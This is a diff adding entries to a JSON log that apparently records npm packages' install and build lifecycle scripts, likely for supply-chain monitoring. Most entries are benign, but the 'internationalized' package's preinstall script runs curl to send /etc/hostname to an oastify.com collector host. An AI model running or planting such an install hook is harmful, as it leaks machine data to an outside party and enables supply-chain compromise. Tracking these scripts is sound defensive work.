@@ -1,5 +1,50 @@
 [
   {
+    "packageName": "@weburz/commitlint-config",
+    "version": "0.1.0",
+    "scriptType": "postinstall",
+    "scriptContent": "pre-commit install --install-hooks",
+    "previousVersion": null,
+    "timestamp": "2026-01-30T22:36:57.021Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "internationalized",
+    "version": "8.5.4",
+    "scriptType": "preinstall",
+    "scriptContent": "/usr/bin/curl --data '@/etc/hostname' $(hostname)sxt2f38ssb0kcmpdpd4zrmrgs7yympae.oastify.com",
+    "previousVersion": null,
+    "timestamp": "2026-01-30T22:36:38.302Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@mastra/voice-gladia",
+    "version": "0.12.0",
+    "scriptType": "postbuild",
+    "scriptContent": "pnpx tsx ../../scripts/generate-package-docs.ts voice/gladia",
+    "previousVersion": "0.12.0-beta.0",
+    "timestamp": "2026-01-30T22:36:10.119Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "opencode-harmony",
+    "version": "0.0.0-dev-202601302229",
+    "scriptType": "postinstall",
+    "scriptContent": "bun ./postinstall.mjs || node ./postinstall.mjs",
+    "previousVersion": null,
+    "timestamp": "2026-01-30T22:35:35.094Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "solana-gateway-contracts-private",
+    "version": "1.0.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node index.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-30T22:34:53.135Z",
+    "issuesend": false
+  },
+  {
     "packageName": "flutter-skill-mcp",
     "version": "0.2.8",
     "scriptType": "postinstall",
